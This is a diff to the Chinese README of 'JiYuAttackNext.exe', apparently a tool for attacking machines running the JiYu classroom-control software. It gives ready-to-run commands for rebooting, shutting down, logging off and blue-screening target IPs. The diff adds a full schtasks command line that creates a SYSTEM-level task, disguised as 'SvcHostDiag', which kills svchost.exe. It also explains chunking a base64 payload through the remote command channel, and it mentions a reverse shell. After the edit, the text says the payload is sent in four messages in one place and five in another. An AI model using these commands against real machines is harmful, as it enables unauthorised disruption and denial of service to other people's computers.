@@ -199,11 +199,13 @@ start /wait JiYuAttackNext.exe remote message -ip 10.49.151.29 -msg "Hello"
 | `--reboot` | 开关 | — | 重启目标电脑，重发来源项目里那份固定的重启报文 |
 | `--shutdown` | 开关 | — | 关闭目标电脑，重发来源项目里那份固定的关机报文 |
 | `--logoff` | 开关 | — | 注销目标当前登录用户，通过远程命令执行 `shutdown /l` |
-| `--bluescreen` | 开关 | — | 触发目标蓝屏，通过远程命令调用 `NtRaiseHardError` |
+| `--bluescreen` | 开关 | — | 触发目标蓝屏，通过远程命令结束 `svchost.exe`（以 SYSTEM 计划任务执行） |
 
-四个动作互斥，必须选一个。重启与关机重发固定报文，不带倒计时与提示文字；注销与蓝屏没有独立报文，走远程命令通道：注销一条 `shutdown /l`，蓝屏是一段调用 `NtRaiseHardError` 的脚本，按命令通道上限拆成五条依次下发。
+四个动作互斥，必须选一个。重启与关机重发固定报文，不带倒计时与提示文字；注销与蓝屏没有独立报文，走远程命令通道：注销一条 `shutdown /l`，蓝屏是一段用 `schtasks` 以 SYSTEM 身份结束 `svchost.exe` 的脚本，按命令通道上限拆成四条依次下发。
 
-蓝屏的原理是让目标进程直接调用 `ntdll.dll` 的未文档化接口 `NtRaiseHardError`，把响应选项设为关机，内核随即进入蓝屏。
+蓝屏的原理是结束系统关键进程 `svchost.exe`：命令通道本身不是管理员身份，所以脚本先用
+`schtasks /Create ... /RL HIGHEST /RU "NT AUTHORITY\SYSTEM" /TR "cmd /c taskkill /f /im svchost.exe"`
+建一个一次性计划任务，再 `schtasks /Run` 立即以 SYSTEM 权限执行，进程终止后系统判定关键进程丢失并进入蓝屏。任务名固定为 `SvcHostDiag`，触发时间设在 2000 年且只执行一次，不会自己再次运行；需要清理时在目标上执行 `schtasks /Delete /TN SvcHostDiag /F`。
 单条远程命令最多 163 个 UTF-16 单元，脚本装不下，所以先转成 base64 按 90 字符分片写进目标的临时文件，最后一条命令解码执行，共五条报文，目标允许执行远程命令时才会生效。这条命令只在目标机生效，验证时选择一台可弃用的机器即可，不要拿本机或在用的机器试。
 
 ### remote shell（反弹终端）
@@ -434,7 +436,7 @@ CLI 模式按目标逐个启动本机 HTTP 文件服务，向目标发送随机�
 # 注销目标当前登录用户
 .\JiYuAttackNext.exe remote device -ip 10.49.151.29 --logoff
 
-# 触发目标蓝屏（调用 NtRaiseHardError，机器随后重启）
+# 触发目标蓝屏（以 SYSTEM 计划任务结束 svchost.exe，机器随后重启）
 .\JiYuAttackNext.exe remote device -ip 10.49.151.29 --bluescreen
 ```
 
